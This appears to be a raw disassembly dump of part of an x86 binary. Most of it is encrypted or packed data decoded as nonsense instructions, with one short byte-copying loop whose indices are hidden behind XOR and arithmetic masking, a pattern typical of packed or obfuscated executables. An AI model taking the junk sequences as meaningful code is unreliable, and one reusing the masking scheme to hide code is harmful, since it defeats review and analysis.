  403f26:	enter  0xeec9,0xe5
  403f2a:	(bad)  
  403f2b:	cmc    
  403f2c:	icebp  
  403f2d:	repz aam 0xd1
  403f30:	loop   0x403f0c
  403f32:	cli    
  403f33:	cmc    
  403f34:	rcr    ebp,0xf9
  403f37:	std    
  403f38:	push   cs
  403f39:	(bad)  
  403f3a:	call   0xc619084c
  403f3f:	ret    0xb7ec
  403f42:	iret   
  403f43:	out    dx,al
  403f44:	in     eax,dx
  403f45:	xlat   BYTE PTR ds:[ebx]
  403f46:	out    0xdf,eax
  403f48:	mov    bh,0xff
  403f4a:	(bad)  
  403f4b:	fdiv   QWORD PTR [edx+esi*8-0xa12fd46]
  403f52:	in     eax,0xd0
  403f54:	fdivrp st(7),st
  403f56:	push   es
  403f57:	call   esi
  403f59:	int    0xd4
  403f5b:	add    cl,dl
  403f5d:	retf   
  403f5e:	leave  
  403f5f:	(bad)  
  403f60:	in     eax,0xe0
  403f62:	mov    dl,0xf3
  403f64:	test   al,0xcc
  403f66:	mov    bh,0xb4
  403f68:	not    ah
  403f6a:	(bad)  
  403f6b:	mov    edi,0xdfece2bf
  403f70:	loope  0x403f5e
  403f72:	jmp    0x403f4e
  403f74:	dec    BYTE PTR [eax]
  403f76:	pop    es
  403f77:	or     BYTE PTR [ecx],al
  403f79:	fadd   st,st(2)
  403f7b:	or     al,0x8
  403f7d:	lods   eax,DWORD PTR ds:[esi]
  403f7e:	enter  0xc5d2,0xd7
  403f82:	mov    dh,0xb0
  403f84:	fcmovb st,st(4)
  403f86:	jmp    0xdd2b1878
  403f8b:	ret    
  403f8c:	enter  0xf7f5,0xc0
  403f90:	fadd   st(2),st
  403f92:	pop    es
  403f93:	shl    dh,0xc1
  403f96:	sti    
  403f97:	or     cl,cl
  403f99:	cld    
  403f9a:	loope  0x403f9b
  403f9c:	shl    BYTE PTR [ebx-0xc21572d],cl
  403fa2:	int    0xf3
  403fa4:	in     al,0xe9
  403fa6:	(bad)  
  403fa7:	sar    DWORD PTR [edi-0x35324416],cl
  403fad:	fidivr DWORD PTR [esi-0x211b2c0f]
  403fb3:	sti    
  403fb4:	jecxz  0x403fb8
  403fb6:	or     cl,al
  403fb8:	loope  0x403fb5
  403fba:	leave  
  403fbb:	or     eax,0xbfa8df04
  403fc0:	mov    dh,0xbc
  403fc2:	call   0xecfaf7a2
  403fc7:	shl    BYTE PTR [ebp-0x2d094312],1
  403fcd:	stc    
  403fce:	mov    DWORD PTR [ebp-0xc],eax
  403fd1:	jmp    0x403feb
  403fd6:	mov    eax,DWORD PTR [ebp-0x8]
  403fd9:	xor    eax,0x75108b5
  403fde:	mov    ecx,DWORD PTR [ebp-0xc]
  403fe1:	lea    eax,[ecx+eax*1+0x3272fb]
  403fe8:	mov    DWORD PTR [ebp-0xc],eax
  403feb:	mov    eax,DWORD PTR [ebp-0xc]
  403fee:	xor    ecx,ecx
  403ff0:	sub    eax,0x5424137
  403ff5:	sbb    ecx,0x0
  403ff8:	xor    eax,0x8a29a14b
  403ffd:	xor    ecx,0x0
  404000:	mov    edx,DWORD PTR [ebp+0x10]
  404003:	xor    esi,esi
  404005:	sub    edx,0x5424137
  40400b:	sbb    esi,0x0
  40400e:	xor    edx,0x8a29a14b
  404014:	xor    esi,0x0
  404017:	mov    DWORD PTR [ebp-0x24],eax
  40401a:	mov    DWORD PTR [ebp-0x20],ecx
  40401d:	mov    DWORD PTR [ebp-0x2c],edx
  404020:	mov    DWORD PTR [ebp-0x28],esi
  404023:	mov    eax,DWORD PTR [ebp-0x24]
  404026:	cmp    eax,DWORD PTR [ebp-0x2c]
  404029:	jne    0x40403b
  40402f:	mov    eax,DWORD PTR [ebp-0x20]
  404032:	cmp    eax,DWORD PTR [ebp-0x28]
  404035:	je     0x404071
  40403b:	mov    eax,DWORD PTR [ebp-0x4]
  40403e:	xor    eax,0x75108b5
  404043:	mov    ecx,DWORD PTR [ebp-0xc]
  404046:	lea    eax,[ecx+eax*1+0x3272fb]
  40404d:	mov    ecx,DWORD PTR [ebp-0x8]
  404050:	xor    ecx,0x75108b5
  404056:	add    ecx,0x3272fb
  40405c:	imul   ecx,DWORD PTR [ebp-0xc]
  404060:	mov    edx,DWORD PTR [ebp+0x8]
  404063:	mov    esi,DWORD PTR [ebp+0xc]
  404066:	mov    al,BYTE PTR [esi+eax*1]
  404069:	mov    BYTE PTR [edx+ecx*1],al
  40406c:	jmp    0x403fd6
  404071:	mov    eax,0xf89c85b3
  404076:	jmp    0x404085
  40407b:	jmp    0x404085
  404080:	mov    eax,0xf89c85b0
  404085:	pop    esi
  404086:	leave  
  404087:	ret    0xc
  40408a:	push   ebp
  40408b:	mov    ebp,esp
  40408d:	jmp    0x4063db
  404092:	in     al,0x68
  404094:	sbb    DWORD PTR gs:[ebp+0x34],esi
  404098:	in     al,0x74
  40409a:	sub    al,0x46
  40409c:	jnp    0x4040fa
  40409e:	xchg   ebx,eax
  40409f:	jl     0x404070
  4040a1:	scas   eax,DWORD PTR es:[edi]
  4040a2:	stos   BYTE PTR es:[edi],al
  4040a3:	cwde   
  4040a4:	jnp    0x404121
  4040a6:	stos   BYTE PTR es:[edi],al
  4040a7:	cwde   
  4040a8:	jnp    0x404125
  4040aa:	iret   
  4040ab:	jecxz  0x4040aa
  4040ad:	(bad)  
  4040af:	add    bh,bh
  4040b1:	add    BYTE PTR ds:0xdd80dea,al
  4040b7:	fcmovnb st,st(0)
  4040b9:	in     al,dx
  4040ba:	jmp    0xc8f813a8
  4040bf:	imul   eax
  4040c1:	mov    ah,0xc9
  4040c3:	in     al,0xb7
  4040c5:	not    al
  4040c7:	mov    edi,0xeebcf2fd
  4040cc:	mov    ah,0xf6
  4040ce:	fcmovbe st,st(0)
  4040d0:	add    eax,0xc9000902
  4040d5:	(bad)  
  4040d7:	adc    bh,cl
  4040d9:	loop   0x4040ce
  4040db:	test   ah,0xe5
  4040de:	(bad)  
  4040df:	mov    al,0xfa
  4040e1:	sar    al,1
  4040e3:	jmp    0xc9be:0xbfd9dfb0
  4040ea:	shl    ch,1
  4040ec:	loop   0x4040d4
  4040ee:	(bad)  
  4040ef:	rcr    ah,cl
  4040f1:	loope  0x4040fe
  4040f3:	imul   dh
  4040f5:	add    eax,0xc6cdee08
  4040fa:	stos   BYTE PTR es:[edi],al
  4040fb:	in     eax,dx
  4040fc:	jmp    0xeec5:0xd1f2f0c6
  404103:	retf   0xcbed
  404106:	mov    ah,0xdf
  404108:	int3   
  404109:	std    
  40410a:	rcr    ebp,0xfc
  40410d:	pop    es
  40410e:	sar    BYTE PTR [ebp-0x3b243d08],0xe5
  404115:	aad    0xeb
  404117:	jmp    esi
  404119:	lock stos BYTE PTR es:[edi],al
  40411b:	mov    dl,0xf3
  40411d:	in     al,0xd6
  40411f:	aam    0xb2
  404121:	xlat   BYTE PTR ds:[ebx]
  404122:	inc    esp
  404124:	mov    ecx,0xefeeeed4
  404129:	xlat   BYTE PTR ds:[ebx]
  40412a:	in     al,dx
  40412b:	fidiv  DWORD PTR [esi+edx*8-0xe472cf9]
  404132:	jmp    0xd42403d
  404137:	shr    esi,cl
  404139:	fld1   
  40413b:	jecxz  0x404133
  40413d:	mov    ch,0xeb
  40413f:	in     eax,0xf7
  404141:	int3   
  404142:	shl    esi,cl
  404144:	(bad)  
  404147:	int3   
  404148:	(bad)  
  404149:	(bad)  
  40414b:	cmc    
  40414c:	fdivp  st(7),st
  40414e:	clc    
  40414f:	not    bh
  404151:	ror    BYTE PTR [eax],1
  404153:	(bad)  
  404154:	(bad)  
  404155:	out    dx,al
  404156:	add    al,0xef
  404158:	add    al,bl
  40415a:	ret    
  40415b:	call   0xd5181135
  404160:	ret    0xeded
  404163:	out    0xd6,eax
  404165:	fucomi st,st(2)
  404167:	sti    
  404168:	jecxz  0x404162
  40416a:	out    0xef,eax
  40416c:	mov    esp,0xf6c5ebbe
  404171:	mov    edi,0x102d5eb
  404176:	stc    
  404177:	adc    dl,dl
  404179:	mov    esi,0xefc2ddd1
  40417e:	out    0xe2,al
  404180:	fcmovu st,st(1)
  404182:	int3   
  404183:	jmp    0xd82b1567
  404188:	mov    edi,0xfafcfefa
  40418d:	pop    es
  40418e:	icebp  
  40418f:	fcmovnbe st,st(6)
  404191:	loopne 0x404174
  404193:	retf   0xefda
  404196:	fcom   QWORD PTR [edx]
  404198:	fucompp 
  40419a:	retf   
  40419b:	test   eax,0xd2b2ecce
  4041a0:	(bad)  
  4041a1:	iret   
  4041a2:	in     al,dx
  4041a3:	mov    ecx,0xfeecd3b9
  4041a8:	retf   0xf6dc
  4041ab:	(bad)  
  4041ac:	in     eax,0xcc
  4041ae:	loopne 0x4041b7
  4041b0:	rcr    ch,cl
  4041b2:	fisttp DWORD PTR [edx]
  4041b4:	add    bl,bh
  4041b6:	inc    ebp
  4041b8:	into   
  4041b9:	retf   0xe2e2
  4041bc:	mov    esp,0xb2e9e9c4
  4041c1:	out    0xd0,eax
  4041c3:	xlat   BYTE PTR ds:[ebx]
  4041c4:	(bad)  
  4041c5:	jmp    0x4041c4
  4041c7:	(bad)  
  4041c8:	clc    
  4041c9:	(bad)  
  4041ca:	loope  0x4041ce
  4041cc:	push   es
  4041cd:	lds    edi,FWORD PTR [esi-0x3e361f2f]
  4041d3:	push   es
  4041d4:	add    ecx,DWORD PTR [esi]
  4041d6:	(bad)
  4041d9:	mov    ebp,0xd2f2dfad
  4041de:	ret    0xb2e8
  4041e1:	lock clc 
  4041e3:	mov    bh,0xd6
  4041e5:	aad    0xcc
  4041e7:	mov    ch,0xb4
  4041e9:	aad    0xb6
  4041eb:	cli    
  4041ec:	repnz repnz loopne 0x4041e7
  4041f0:	clc    
  4041f1:	lock cli 
  4041f3:	push   es
  4041f4:	(bad)  
  4041f5:	clc    
  4041f6:	or     eax,0xa9c4cb06
  4041fb:	enter  0xe5dd,0xdb
  4041ff:	mov    dl,0xb2
  404201:	in     eax,0xbb
  404203:	mov    ah,0xe5
  404205:	in     eax,0xf7
  404207:	ret    
  404208:	clc    
  404209:	fcomi  st,st(5)
  40420b:	ret    
  40420c:	mov    esp,0xd7c6bedf
  404211:	(bad)  
  404213:	add    bl,dh
  404215:	push   cs
  404216:	fsqrt  
  404218:	(bad)  
  404219:	test   al,0xe1
  40421b:	loopne 0x4041e4
  40421d:	jecxz  0x4041ef
  40421f:	hlt    
  404220:	mov    ebp,0xb6deedef
  404226:	fdivr  QWORD PTR [ecx-0x292c2908]
  40422c:	loope  0x4041ed
  40422e:	(bad)  
  40422f:	or     ecx,ebx
  404231:	fdivp  st(0),st
  404233:	hlt    
  404234:	vpaddusw xmm7,xmm6,xmm6
  404238:	retf   0xc6b8
  40423b:	shl    DWORD PTR [eax-0xf283d3b],1
  404241:	aad    0xd3
  404243:	stc    
  404244:	hlt    
  404245:	mov    ch,0xff
  404247:	aad    0xb0
  404249:	(bad)  
  40424b:	(bad)  
  40424d:	fcomp  st(4)
  40424f:	sar    DWORD PTR [esp+eiz*8-0x1317161d],cl
  404256:	loop   0x40423a
  404258:	or     eax,0xc9a9eeec
  40425d:	in     al,dx
  40425e:	mov    cl,0xf7
  404260:	iret   
  404261:	mov    cl,0xba
  404263:	jmp    0xbcee:0xe3b9f1ed
  40426a:	hlt    
  40426b:	loope  0x40424e
  40426d:	fcmovbe st,st(2)
  40426f:	repz pop es
  404271:	call   0xc93a2a7b
  404276:	fcmovne st,st(5)
  404278:	push   es
  404279:	lods   eax,DWORD PTR ds:[esi]
  40427a:	(bad)  
  40427c:	mov    al,0xdd
  40427e:	repnz jmp 0xe9e5:0xd2d0e4db
  404286:	into   
  404287:	sar    BYTE PTR [ebx-0x3e27ff11],1
  40428d:	repz mov esi,0xddf5e3e5
  404293:	push   es
  404294:	jecxz  0x4042a2
  404296:	add    BYTE PTR [eax],cl
  404298:	shl    DWORD PTR [ebx-0x185b1557],cl
  40429e:	rol    bl,0xd1
  4042a1:	jmp    0xd7dd:0xc4eceef1
  4042a8:	ret    0xb8b7
  4042ab:	mov    esp,0xc1def5e5
  4042b0:	sar    edi,0x8
  4042b3:	loope  0x4042b6
  4042b5:	pinsrw mm1,WORD PTR ds:0xe9cbc6dd,0xf1
  4042bd:	leave  
  4042be:	(bad)  
  4042bf:	loope  0x404278
  4042c1:	iret   
  4042c2:	mov    ch,0xfb
  4042c4:	in     eax,dx
  4042c5:	rol    ah,cl
  4042c7:	mov    ch,0xf0
  4042c9:	test   cl,0xff
  4042cc:	cld    
  4042cd:	int3   
  4042ce:	(bad)  
  4042d0:	(bad)
  4042d3:	xlat   BYTE PTR ds:[ebx]
  4042d4:	(bad)  
  4042d5:	cmc    
  4042d6:	clc    
  4042d7:	(bad)  
  4042d9:	lods   al,BYTE PTR ds:[esi]
  4042da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042db:	lock in al,0xb1
  4042de:	mov    bl,0xf5
  4042e0:	out    dx,al
  4042e1:	into   
  4042e2:	stc    
  4042e3:	iret   
  4042e4:	sar    BYTE PTR [ecx+0x2ecebf4],1
  4042ea:	mov    ecx,0x2d3d9d0
  4042ef:	(bad)  
  4042f0:	cld    
  4042f1:	fsub   st(2),st
  4042f3:	add    BYTE PTR [ecx],al
  4042f5:	or     ebx,ecx
  4042f7:	std    
  4042f8:	add    ebx,eax
  4042fa:	(bad)  
  4042fb:	iret   
  4042fc:	(bad)  
  4042fd:	loope  0x4042f4
  4042ff:	lock into 
  404301:	cmc    
  404302:	div    cl
  404304:	(bad)  
  404305:	(bad)  
  404306:	(bad)  
  404308:	into   
  404309:	icebp  
  40430a:	aad    0xcc
  40430c:	out    0xd0,al
  40430e:	cmc    
  40430f:	rcr    ah,0xa
  404312:	leave  
  404313:	iret   
  404314:	shl    bl,0x8
  404317:	loop   0x4042ff
  404319:	ror    esi,0xb3
  40431c:	mov    dh,0xbc
  40431e:	in     al,dx
  40431f:	lock hlt 
  404321:	retf   0xccb0
  404324:	(bad)  
  404325:	hlt    
  404326:	int    0xf1
  404328:	jmp    0xffbd:0xf0c2f2fd
  40432f:	shl    bh,0xd7
  404332:	mov    esi,0xc4f4d900
  404337:	out    dx,al
  404338:	fnstcw WORD PTR [esi-0x4f1a503b]
  40433e:	fcmovnbe st,st(6)
  404340:	(bad)  
  404342:	fnstcw WORD PTR [ebx-0x364c41]
  404348:	(bad)  
  404349:	fcmovbe st,st(2)
  40434b:	rol    esi,0xf3
  40434e:	repz xlat BYTE PTR ds:[ebx]
  404350:	shl    eax,0xfb
  404353:	push   cs
  404354:	loop   0x40433b
  404356:	leave  
  404357:	clc    
  404358:	or     eax,0xe2e2aae3
  40435d:	(bad)  
  40435e:	retf   0xc9c1
  404361:	out    dx,eax
  404362:	enter  0xc9c5,0xf2
  404366:	rcr    edi,1
  404368:	stc    
  404369:	ret    0xdee2
  40436c:	add    edi,esi
  40436e:	pop    es
  40436f:	loopne 0x404354
  404371:	rol    ecx,1
  404373:	push   cs
  404374:	in     eax,dx
  404375:	or     DWORD PTR [eax],eax
  404377:	in     al,dx
  404378:	jmp    0xea282635
  40437d:	loopne 0x404346
  40437f:	int3   
  404380:	mov    ch,0xb6
  404382:	cmc    
  404383:	fcmovnu st,st(0)
  404385:	mov    ah,0xdb
  404387:	mov    esp,0xd8def2fc
  40438c:	aad    0xf0
  40438e:	std    
  40438f:	in     al,0xe3
  404391:	out    0xca,al
  404393:	inc    esi
  404395:	in     al,0xdd
  404397:	enter  0xbfc4,0xc8
  40439b:	test   al,0xca
  40439d:	in     eax,0xee
  40439f:	(bad)  
  4043a0:	xlat   BYTE PTR ds:[ebx]
  4043a1:	int    0xeb
  4043a3:	leave  
  4043a4:	jmp    0x40436b
  4043a6:	test   ebx,0xd9ffe2f6
  4043ac:	mov    edi,0xe6d4e1e7
  4043b2:	pop    es
  4043b3:	faddp  st(4),st
  4043b5:	aad    0x2
  4043b7:	push   es
  4043b8:	or     ebp,ebp
  4043ba:	test   eax,0xf6c2e4ec
  4043bf:	(bad)  
  4043c0:	out    dx,al
  4043c1:	mov    ebx,0xf9dfe6f0
  4043c6:	sti    
  4043c7:	mov    ebx,0xf5f8f6f2
  4043cc:	push   es
  4043cd:	int3   
  4043ce:	int3   
  4043cf:	jmp    0x404397
  4043d1:	hlt    
  4043d2:	cmc    
  4043d3:	idiv   ah
  4043d5:	push   es
  4043d6:	add    al,0xc9
  4043d8:	in     eax,0xae
  4043da:	loopne 0x40438a
  4043dc:	out    0xc5,eax
  4043de:	in     eax,dx
  4043df:	loopne 0x4043ae
  4043e1:	in     eax,0xc0
  4043e3:	ror    bh,1
  4043e5:	enter  0xbdea,0xd4
  4043e9:	inc    al
  4043eb:	ret    0xe5f8
  4043ee:	(bad)  
  4043ef:	inc    BYTE PTR [ecx]
  4043f1:	lock add BYTE PTR [eax],cl
  4043f4:	vshufps xmm0,xmm3,xmm4,0xe4
  4043f9:	(bad)  
  4043fa:	loopne 0x4043a8
  4043fc:	faddp  st(0),st
  4043fe:	vpsllw ymm0,ymm5,xmm6
  404402:	rol    edi,cl
  404404:	int3   
  404405:	mov    ecx,0xfdcfd0f7
  40440a:	mov    edx,0xf2bfcdc7
  40440f:	icebp  
  404410:	cld    
  404411:	(bad)  
  404412:	mov    esi,0xf9e7d6cf
  404417:	bswap  edi
  404419:	retf   0xc5e6
  40441c:	out    0xe7,eax
  40441e:	jmp    0xb4b4:0xefb4f7db
  404425:	std    
  404426:	(bad)  
  404427:	jmp    0xd01d0718
  40442c:	loop   0x404409
  40442e:	aam    0xe0
  404430:	out    0xe1,al
  404432:	les    edi,FWORD PTR [ebp+0x5e8c7fe]
  404438:	retf   
  404439:	shl    esi,1
  40443b:	scas   al,BYTE PTR es:[edi]
  40443c:	jmp    0xb7d2:0xefd2b3f7
  404443:	(bad)  
  404446:	out    dx,eax
  404447:	retf   0xfafb
  40444a:	(bad)  
  40444c:	int    0xe4
  40444e:	test   BYTE PTR [edx],0xca
  404451:	retf   0xe3e8
  404454:	cmc    
  404455:	push   es
  404456:	out    0xfa,eax
  404458:	(bad)  
  404459:	mov    esp,0xecc4ddc6
  40445e:	xlat   BYTE PTR ds:[ebx]
  40445f:	repz retf 
  404461:	iret   
  404462:	fcmovb st,st(4)
  404464:	repnz shr al,cl
  404467:	in     eax,dx
  404468:	aam    0xbd
  40446a:	inc    BYTE PTR [edi]
  40446c:	clc    
  40446d:	loope  0x404462
  40446f:	add    al,bl
  404471:	ret    0xbbe
  404474:	add    al,ch
  404476:	add    eax,0xc6cb05ca
  40447b:	ret    0xc0d5
  40447e:	jmp    0xd8ed:0xf1b9b3d2
  404485:	out    dx,al
  404486:	cmc    
  404487:	fucomp st(6)
  404489:	xlat   BYTE PTR ds:[ebx]
  40448a:	cli    
  40448b:	iret   
  40448c:	into   
  40448d:	cld    
  40448e:	shl    bl,1
  404490:	mov    eax,0xee5fe00
  404495:	fxam   
  404497:	add    DWORD PTR [ebx],eax
  404499:	stos   BYTE PTR es:[edi],al
  40449a:	les    esp,FWORD PTR [ebp-0x2f194338]
  4044a0:	sar    DWORD PTR [edx-0xe361913],0xc4
  4044a7:	add    dl,ah
  4044a9:	icebp  
  4044aa:	sti    
  4044ab:	rol    al,cl
  4044ad:	loope  0x4044b0
  4044af:	rcl    esp,0xe3
  4044b2:	bswap  ecx
  4044b4:	retf   
  4044b5:	(bad)  
  4044b6:	(bad)  
  4044b7:	call   0xc7252dc5
  4044bc:	(bad)  
  4044bd:	ror    ch,cl
  4044bf:	into   
  4044c0:	loope  0x40449d
  4044c2:	out    0xf6,eax
  4044c4:	(bad)  
  4044c7:	int    0xf8
  4044c9:	sar    ebp,0xb8
  4044cc:	in     eax,0xf9
  4044ce:	lock in al,0xe4
  4044d1:	jecxz  0x4044db
  4044d3:	retf   
  4044d4:	loopne 0x4044a1
  4044d6:	stc    
  4044d7:	or     DWORD PTR [ecx],eax
  4044d9:	loopne 0x4044a6
  4044db:	repnz int 0xd5
  4044de:	iret   
  4044df:	mov    bl,0xb6
  4044e1:	fcmovbe st,st(4)
  4044e3:	(bad)  
  4044e5:	rcr    edx,1
  4044e7:	mov    ebp,0xc0edc8d4
  4044ec:	mov    esp,0x1c7c3e4
  4044f1:	add    al,0xc6
  4044f3:	(bad)  
  4044f4:	or     ebx,ebx
  4044f6:	fsubrp st(2),st
  4044f8:	out    0xe1,al
  4044fa:	test   ebp,0xedc2f7e3
  404500:	icebp  
  404501:	mov    bl,0xea
  404503:	jmp    0xf1ea:0xbef7bfcf
  40450a:	add    eax,DWORD PTR [esi]
  40450c:	sti    
  40450d:	fild   WORD PTR ds:0xfedb0004
  404513:	xlat   BYTE PTR ds:[ebx]
  404514:	invd   
  404516:	(bad)
  404519:	mov    cl,0xf3
  40451b:	(bad)  
  40451c:	enter  0xb1ef,0xb4
  404520:	repnz mov edx,0xc9cce4d5
  404526:	rcr    bl,1
  404528:	(bad)  
  40452a:	out    dx,eax
  40452b:	(bad)  
  40452c:	loopne 0x404502
  40452e:	fld    DWORD PTR [ecx]
  404530:	fprem1 
  404532:	cld    
  404533:	loopne 0x404535
  404535:	out    0xe7,al
  404537:	loope  0x404511
  404539:	int    0xdf
  40453b:	out    dx,al
  40453c:	shr    eax,cl
  40453e:	ror    ebx,0xca
  404541:	(bad)  
  404542:	leave  
  404543:	mov    cl,0xbb
  404545:	lock mov eax,0xc3f1d7f5
  40454b:	out    dx,al
  40454c:	out    0xd2,eax
  40454e:	xlat   BYTE PTR ds:[ebx]
  40454f:	(bad)  
  404550:	out    0xda,eax
  404552:	xlat   BYTE PTR ds:[ebx]
  404553:	pop    es
  404554:	loopne 0x40452a
  404556:	aam    0xef
  404558:	fcom   st(2)
  40455a:	scas   eax,DWORD PTR es:[edi]
  40455b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40455c:	loop   0x404533
  40455e:	out    dx,al
  40455f:	lock mov ebx,0xdef6c7fb
  404565:	mov    dh,0xe4
  404567:	xlat   BYTE PTR ds:[ebx]
  404568:	(bad)  
  40456a:	enter  0xe7df,0xdb
  40456e:	add    esp,ebx
  404570:	fdiv   st,st(7)
  404572:	fcmovnbe st,st(4)
  404574:	in     eax,0xe7
  404576:	out    0xed,eax
  404578:	enter  0xe0d2,0xae
  40457c:	out    dx,al
  40457d:	in     al,0xdc
  40457f:	int    0xdb
  404581:	loopne 0x40454d
  404583:	xlat   BYTE PTR ds:[ebx]
  404584:	call   0xd5123085
  404589:	loopne 0x404585
  40458b:	std    
  40458c:	test   BYTE PTR ds:0xe6dceaeb,0x6
  404593:	rol    edi,0xcb
  404596:	jmp    0x404583
  404598:	in     eax,0xe1
  40459a:	fdivr  st(6),st
  40459c:	call   0xf4f2076a
  4045a1:	mov    dh,0xf4
  4045a3:	(bad)
  4045a6:	in     eax,dx
  4045a7:	fninit 
  4045a9:	rcl    esi,1
  4045ab:	mov    ebp,0xfafac1d0
  4045b0:	cli    
  4045b1:	(bad)  
  4045b3:	add    ch,al
  4045b5:	push   cs
  4045b6:	out    dx,eax
  4045b7:	jecxz  0x4045a8
  4045b9:	ret    0xf1aa
  4045bc:	repz in eax,dx
  4045be:	icebp  
  4045bf:	loopne 0x404578
  4045c1:	into   
  4045c2:	in     eax,dx
  4045c3:	mov    al,0xb5
  4045c5:	cmc    
  4045c6:	int3   
  4045c7:	repz ror esi,cl
  4045ca:	cli    
  4045cb:	mov    ebp,0xd5d4e0de
  4045d0:	lock or cl,al
  4045d3:	fcmove st,st(1)
  4045d5:	cmc    
  4045d6:	fdivrp st(3),st
  4045d8:	cld    
  4045d9:	loopne 0x404583
  4045db:	scas   eax,DWORD PTR es:[edi]
  4045dc:	mov    dl,0xe5
  4045de:	mov    bh,0xc3
  4045e0:	repz out 0xd1,al
  4045e3:	jmp    0xfaf61cd5
  4045e8:	enter  0xdce1,0xc2
  4045ec:	xlat   BYTE PTR ds:[ebx]
  4045ed:	xlat   BYTE PTR ds:[ebx]
  4045ee:	mov    edx,0xcac6c303
  4045f3:	jmp    0xc5ef:0xf2ebdcdc
  4045fa:	in     al,0xde
  4045fc:	repz leave 
  4045fe:	hlt    
  4045ff:	mov    ch,0xf7
  404601:	fcomp  st(2)
  404603:	shr    al,1
  404605:	mov    edi,0xd7f8dbf0
  40460a:	std    
  40460b:	mov    esi,0xf6fad1d3
  404610:	shl    cl,1
  404612:	pop    es
  404613:	loop   0x4045fc
  404615:	add    ecx,ebx
  404617:	adc    esi,ebx
  404619:	shr    DWORD PTR [ecx+esi*8-0x531c2b2f],0xa8
  404621:	sti    
  404622:	clc    
  404623:	iret   
  404624:	mov    ecx,0xf5cdbbdd
  404629:	stc    
  40462a:	in     al,dx
  40462b:	fnstsw WORD PTR [edi-0x3290301]
  404631:	shl    dh,0xe2
  404634:	or     BYTE PTR [ecx*1-0x131bf0f1],al
  40463b:	loopne 0x40460a
  40463d:	scas   al,BYTE PTR es:[edi]
  40463e:	test   ecx,0xdaf4ebb3
  404644:	out    dx,al
  404645:	xlat   BYTE PTR ds:[ebx]
  404646:	(bad)  
  404647:	mov    ah,0xde
  404649:	aad    0xc3
  40464b:	aam    0xe3
  40464d:	cli    
  40464e:	lds    eax,FWORD PTR [ebx]
  404650:	sti    
  404651:	cmc    
  404652:	jecxz  0x40464c
  404654:	loopne 0x404639
  404656:	fsub   st(6),st
  404658:	(bad)  
  40465a:	mov    edi,0xaebcf3d3
  40465f:	leave  
  404660:	retf   0xedd7
  404663:	xlat   BYTE PTR ds:[ebx]
  404664:	rcl    ebp,1
  404666:	aam    0xfd
  404668:	fcmovnbe st,st(4)
  40466a:	out    dx,al
  40466b:	rcl    ecx,0xc0
  40466e:	add    al,0xe5
  404670:	std    
  404671:	cli    
  404672:	test   BYTE PTR [eax],0xf8
  404675:	or     edx,edi
  404677:	or     cl,BYTE PTR [eax]
  404679:	repz leave 
  40467b:	lock in eax,0xf4
  40467e:	sti    
  40467f:	rcl    ecx,1
  404681:	mov    cl,0xf7
  404683:	mov    eax,0xb5effcbf
  404688:	enter  0xcfbc,0xdb
  40468c:	cld    
  40468d:	mov    esp,0x7d7de03
  404692:	(bad)
  404695:	les    ecx,FWORD PTR [ebx]
  404697:	push   cs
  404698:	(bad)  
  404699:	faddp  st(4),st
  40469b:	ret    
  40469c:	int3   
  40469d:	lods   eax,DWORD PTR ds:[esi]
  40469e:	loopne 0x404652
  4046a0:	sar    ecx,1
  4046a2:	leave  
  4046a3:	sar    BYTE PTR [esi-0x7442813],cl
  4046a9:	loope  0x4046ac
  4046ab:	(bad)  
  4046ac:	in     eax,dx
  4046ad:	rol    BYTE PTR [edx],1
  4046af:	cld    
  4046b0:	lock clc 
  4046b2:	fild   DWORD PTR [esi]
  4046b4:	(bad)  
  4046b5:	dec    ecx
  4046b7:	cli    
  4046b8:	jecxz  0x404682
  4046ba:	out    0xb1,al
  4046bc:	imul   dh
  4046be:	iret   
  4046bf:	int3   
  4046c0:	out    0xcb,eax
  4046c2:	jmp    0x40468e
  4046c4:	repz (bad) 
  4046c6:	(bad)  
  4046c8:	sar    ebx,1
  4046ca:	(bad)  
  4046cc:	add    eax,0xe9d2d605
  4046d1:	shl    esi,0xdb
  4046d4:	hlt    
  4046d5:	retf   0xe6cc
  4046d8:	push   es
  4046d9:	into   
  4046da:	loope  0x40469d
  4046dc:	(bad)
  4046df:	call   0xeb40079b
  4046e4:	cli    
  4046e5:	cld    
  4046e6:	shl    edx,1
  4046e8:	ret    
  4046e9:	inc    bl
  4046eb:	mov    ch,0xfe
  4046ed:	aad    0xec
  4046ef:	add    esi,ecx
  4046f1:	(bad)  
  4046f2:	loopne 0x4046bc
  4046f4:	or     eax,0xfe0ee0df
  4046f9:	icebp  
  4046fa:	call   0xc6220be4
  4046ff:	out    dx,al
  404700:	ror    esp,cl
  404702:	jmp    0xecee:0xcaedc4e8
  404709:	out    dx,al
  40470a:	mov    ebp,0xdf05dfd9
  40470f:	sti    
  404710:	loopne 0x404708
  404712:	loope  0x40471d
  404714:	or     dh,al
  404716:	jmp    0xa90715fa
  40471b:	rol    ecx,1
  40471d:	hlt    
  40471e:	lods   eax,DWORD PTR ds:[esi]
  40471f:	mov    bl,0xce
  404721:	mov    ebx,0xf7ddccc0
  404726:	fdivr  st,st(4)
  404728:	call   0xb8fe0a0c
  40472d:	mov    ebp,0x6dedff4
  404732:	lock jecxz 0x404713
  404735:	or     ecx,ecx
  404737:	ror    DWORD PTR [eax+ebp*8],cl
  40473a:	loope  0x4046fb
  40473c:	out    0xe7,eax
  40473e:	mov    esp,0xedd4cec2
  404743:	mov    bh,0xd1
  404745:	into   
  404746:	mov    dh,0xda
  404748:	mov    ebx,0xdfbfd8ee
  40474d:	hlt    
  40474e:	lds    eax,FWORD PTR [eax]
  404750:	retf   
  404751:	out    0xca,al
  404753:	mul    eax
  404755:	inc    DWORD PTR [ecx]
  404757:	faddp  st(4),st
  404759:	mov    bl,0xc8
  40475b:	repz icebp 
  40475d:	stos   DWORD PTR es:[edi],eax
  40475e:	out    dx,eax
  40475f:	call   0xe515210c
  404764:	in     eax,dx
  404765:	std    
  404766:	hlt    
  404767:	fdiv   st(2),st
  404769:	mov    esi,0x6d6f8e3
  40476e:	aad    0x7
  404770:	not    dh
  404772:	or     BYTE PTR [ebx],al
  404774:	out    dx,al
  404775:	fdivr  st,st(0)
  404777:	into   
  404778:	add    bh,BYTE PTR [edi-0x54523534]
  40477e:	stos   BYTE PTR es:[edi],al
  40477f:	hlt    
  404780:	lods   al,BYTE PTR ds:[esi]
  404781:	xlat   BYTE PTR ds:[ebx]
  404782:	jmp    0xd0cb:0xcdc8c5c5
  404789:	(bad)  
  40478b:	(bad)  
  40478d:	out    0xfe,eax
  40478f:	out    0xe4,al
  404791:	icebp  
  404792:	fisttp WORD PTR [edi]
